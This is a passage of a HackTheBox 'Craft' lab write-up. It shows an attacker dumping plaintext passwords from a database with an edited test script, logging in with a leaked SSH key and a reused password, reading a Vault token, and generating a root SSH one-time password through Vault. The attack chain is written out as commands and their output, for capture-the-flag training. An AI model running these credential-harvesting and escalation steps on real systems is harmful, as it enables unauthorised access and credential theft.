+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/opt/app <span style="color:#75715e"># mysql</span>
+/bin/sh: mysql: not found
+</code></pre></div><p>Of course, in this jail no <code>mysql</code> available either&hellip; Earlier I noticed a database test script. We will edit use this python script since nothing else is available. First, let's list the tables :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#f92672">import</span> pymysql
+<span style="color:#f92672">from</span> craft_api <span style="color:#f92672">import</span> settings
+
+connection <span style="color:#f92672">=</span> pymysql<span style="color:#f92672">.</span>connect(host<span style="color:#f92672">=</span>settings<span style="color:#f92672">.</span>MYSQL_DATABASE_HOST,
+                             user<span style="color:#f92672">=</span>settings<span style="color:#f92672">.</span>MYSQL_DATABASE_USER,
+                             password<span style="color:#f92672">=</span>settings<span style="color:#f92672">.</span>MYSQL_DATABASE_PASSWORD,
+                             db<span style="color:#f92672">=</span>settings<span style="color:#f92672">.</span>MYSQL_DATABASE_DB,
+                             cursorclass<span style="color:#f92672">=</span>pymysql<span style="color:#f92672">.</span>cursors<span style="color:#f92672">.</span>DictCursor)
+
+<span style="color:#66d9ef">try</span>:
+    <span style="color:#66d9ef">with</span> connection<span style="color:#f92672">.</span>cursor() <span style="color:#66d9ef">as</span> cursor:
+        sql <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">SELECT table_name FROM information_schema.tables;</span><span style="color:#e6db74">&#34;</span>
+        cursor<span style="color:#f92672">.</span>execute(sql)
+        result <span style="color:#f92672">=</span> cursor<span style="color:#f92672">.</span>fetchall()
+        <span style="color:#66d9ef">for</span> row <span style="color:#f92672">in</span> result:
+            <span style="color:#66d9ef">print</span>(row)
+
+<span style="color:#66d9ef">finally</span>:
+    connection<span style="color:#f92672">.</span>close()
+</code></pre></div><p>Running this script will return two tables: <code>brew</code> and <code>users</code>. Of course let's list the users by editing the <code>dbtest.py</code> script :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff"><span style="color:#f92672">- sql = &#34;SELECT table_name FROM information_schema.tables;&#34;
+</span><span style="color:#f92672"></span><span style="color:#a6e22e">+ sql = &#34;SELECT * FROM user;&#34;
+</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/opt/app <span style="color:#75715e"># python dbtest.py</span>
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#39;id&#39;</span>: 1, <span style="color:#e6db74">&#39;username&#39;</span>: <span style="color:#e6db74">&#39;dinesh&#39;</span>, <span style="color:#e6db74">&#39;password&#39;</span>: <span style="color:#e6db74">&#39;4aUh0A8PbVJxgd&#39;</span><span style="color:#f92672">}</span>
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#39;id&#39;</span>: 4, <span style="color:#e6db74">&#39;username&#39;</span>: <span style="color:#e6db74">&#39;ebachman&#39;</span>, <span style="color:#e6db74">&#39;password&#39;</span>: <span style="color:#e6db74">&#39;llJ77D8QFkLPQB&#39;</span><span style="color:#f92672">}</span>
+<span style="color:#f92672">{</span><span style="color:#e6db74">&#39;id&#39;</span>: 5, <span style="color:#e6db74">&#39;username&#39;</span>: <span style="color:#e6db74">&#39;gilfoyle&#39;</span>, <span style="color:#e6db74">&#39;password&#39;</span>: <span style="color:#e6db74">&#39;ZEU3N8WNM2rh4T&#39;</span><span style="color:#f92672">}</span>
+</code></pre></div><p>Good, a few users with plain-text passwords:</p>
+<ul>
+<li>Trying each one on the <code>ssh</code> doesn't work.</li>
+<li>Won't be useful as API credentials</li>
+</ul>
+<p>So what remains is to go back to the Gogs instance. Login as <code>gilfoyle</code> gives us access to a very interesting private repository:</p>
+<!-- raw HTML omitted -->
+<p>Let's clone it to explore it :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ GIT_SSL_NO_VERIFY<span style="color:#f92672">=</span>true git clone https://gilfoyle:ZEU3N8WNM2rh4T@gogs.craft.htb/gilfoyle/craft-infra.git
+</code></pre></div><p>First thing that catches the eye is the <code>.ssh</code> folder containing both the public and private key. We should be able to use to login as <code>gilfoyle</code> through SSH:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ chmod <span style="color:#ae81ff">600</span> .ssh/id_rsa
+$ ssh gilfoyle@craft.htb -i id_rsa
+
+  .   *   ..  . *  *
+*  * @<span style="color:#f92672">(</span><span style="color:#f92672">)</span>Ooc<span style="color:#f92672">(</span><span style="color:#f92672">)</span>*   o  .
+    <span style="color:#f92672">(</span>Q@*0CG*O<span style="color:#f92672">(</span><span style="color:#f92672">)</span>  ___
+   |<span style="color:#ae81ff">\_</span>________/|/ _ <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>   |  |  |  |  | / | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | <span style="color:#ae81ff">\_</span>| |
+   |  |  |  |  |<span style="color:#ae81ff">\_</span>__/
+   |<span style="color:#ae81ff">\_</span>|__|__|_/|
+    <span style="color:#ae81ff">\_</span>________/
+
+Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;id_rsa&#39;</span>:
+Linux craft.htb 4.9.0-8-amd64 <span style="color:#75715e">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span>
+
+Last login: Sun Oct <span style="color:#ae81ff">20</span> 06:26:05 <span style="color:#ae81ff">2019</span> from 10.10.15.50
+gilfoyle@craft:~$
+</code></pre></div><p>A passphrase is needed for the <code>id_rsa</code> key, fortunately we have a case of password reuse and the password <code>ZEU3N8WNM2rh4T</code> found in the database dump is valid.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gilfoyle@craft:~$ cat user.txt
+bbfxxxxxxxxxxxxxa612d4
+</code></pre></div><h1 id="root">Root</h1>
+<h2 id="recon-1">Recon</h2>
+<p>On user <code>gilfoyle</code> nothing particulary catch the eye and the box seems well configured. Upon enumeration we still notice an uncommon ssh configuration :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gilfoyle@craft:~$ cat /etc/ssh/sshd_config
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+PermitRootLogin yes
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</code></pre></div><p>It looks like our entry door for root flag will be through ssh.</p>
+<p>Inspecting files in the home directory also shows a token that might be useful:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gilfoyle@craft:~$ ls -a
+.  ..  .bashrc	.config  .gnupg  .profile  .ssh  user.txt  .vault-token  .viminfo
+gilfoyle@craft:~$ cat .vault-token
+f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
+</code></pre></div><p>We notice this is about Vault again, we saw it already in the <code>craft-infra</code> repository. Let's dig.</p>
+<p>I didn't know anything about Vault so I checked their website :</p>
+<blockquote>
+<p>A tool for secrets management, encryption as a service, and privileged access management
+<a href="https://www.vaultproject.io/">https://www.vaultproject.io/</a></p>
+</blockquote>
+<h2 id="exploiting-vault-for-ssh-root-password">Exploiting Vault for SSH root password</h2>
+<p>If we put all the puzzle pieces together it seems like this tool is storing either the <code>root</code> account password or a way to access the root account through ssh.</p>
+<p>The file <code>craft-infra/src/master/vault/secrets.sh</code> on the <code>craft-infra</code> repository looks promising :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e"># set up vault secrets backend</span>
+
+vault secrets enable ssh
+
+vault write ssh/roles/root_otp <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    key_type<span style="color:#f92672">=</span>otp <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    default_user<span style="color:#f92672">=</span>root <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    cidr_list<span style="color:#f92672">=</span>0.0.0.0/0
+</code></pre></div><p>It confirms that Vault is used for ssh access to root. <code>key_type=otp</code> seems to mean that it's working as a one-time password mechanism.</p>
+<p>After a bit of Googling we find this documentation on Vault:</p>
+<blockquote>
+<p>The One-Time SSH Password (OTP) SSH secrets engine type allows a Vault server to issue a One-Time Password every time a client wants to SSH into a remote host using a helper command on the remote host to perform verification.
+<a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html">https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html</a></p>
+</blockquote>
+<p>Alright, we have all the needed information. Let's generate a One-Time Password for the root account!</p>
+<p>From here I will follow the documentation linked above. First we need to mount the secrets engine:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gilfoyle@craft:~$ vault secrets enable ssh
+Successfully mounted <span style="color:#e6db74">&#39;ssh&#39;</span> at <span style="color:#e6db74">&#39;ssh&#39;</span>!
+</code></pre></div><p>Then we create a role with the <code>key_type</code> parameter set to <code>otp</code>. I will use the same command than the one in <code>craft-infra/src/master/vault/secrets.sh</code> to make sure we are not missing anything:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gilfoyle@craft:~$ vault write ssh/roles/root_otp <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>     key_type<span style="color:#f92672">=</span>otp <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>     default_user<span style="color:#f92672">=</span>root <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>     cidr_list<span style="color:#f92672">=</span>0.0.0.0/0
+Success! Data written to: ssh/roles/root_otp
+</code></pre></div><p>Last step we create an OTP credential for an IP of the remote host that belongs to <code>otp_key_role</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gilfoyle@craft:~$ vault write ssh/creds/root_otp ip<span style="color:#f92672">=</span>10.10.10.110
+Key                Value
+---                -----
+lease_id           ssh/creds/root_otp/15c8d88c-4e1a-6ec6-4cbb-616cf25e1a7d
+lease_duration     768h
+lease_renewable    false
+ip                 10.10.10.110
+key                3d32eb8a-61b1-3376-4402-dd15e72206f8
+key_type           otp
+port               <span style="color:#ae81ff">22</span>
+username           root
+</code></pre></div><p>Seems like everything went fine. Let's launch a new terminal and try to login as <code>root</code> :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh root@craft.htb
+
+  .   *   ..  . *  *
+*  * @<span style="color:#f92672">(</span><span style="color:#f92672">)</span>Ooc<span style="color:#f92672">(</span><span style="color:#f92672">)</span>*   o  .
+    <span style="color:#f92672">(</span>Q@*0CG*O<span style="color:#f92672">(</span><span style="color:#f92672">)</span>  ___
+   |<span style="color:#ae81ff">\_</span>________/|/ _ <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>   |  |  |  |  | / | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | <span style="color:#ae81ff">\_</span>| |
+   |  |  |  |  |<span style="color:#ae81ff">\_</span>__/
+   |<span style="color:#ae81ff">\_</span>|__|__|_/|
+    <span style="color:#ae81ff">\_</span>________/
+
+Password:
+Linux craft.htb 4.9.0-8-amd64 <span style="color:#75715e">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span>
+
+Last login: Sun Oct <span style="color:#ae81ff">20</span> 06:10:03 <span style="color:#ae81ff">2019</span> from 127.0.0.1
+root@craft:~#
+root@craft:~# cat root.txt
+831dxxxxxxxxxxx11591
+</code></pre></div><p>This box was really a fun time and my favorite so far. as always do not hesitate to contact me for any questions or feedback.</p>
+<p>See you next time !</p>
+<p>-hg8</p>
+
+  </div>
+  
+  <div class="pagination">
+    <div class="pagination__title">
+      <span
+        class="pagination__title-h">Read other posts</span>
+      <hr />
+    </div>
+    <div class="pagination__buttons">
+      
+      
+      <span class="button next">
+        <a href="/posts/wall/">
+          <span class="button__text">Wall - HackTheBox</span>
+          <span class="button__icon">→</span>
+        </a>
+      </span>
+      
+    </div>
+  </div>
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
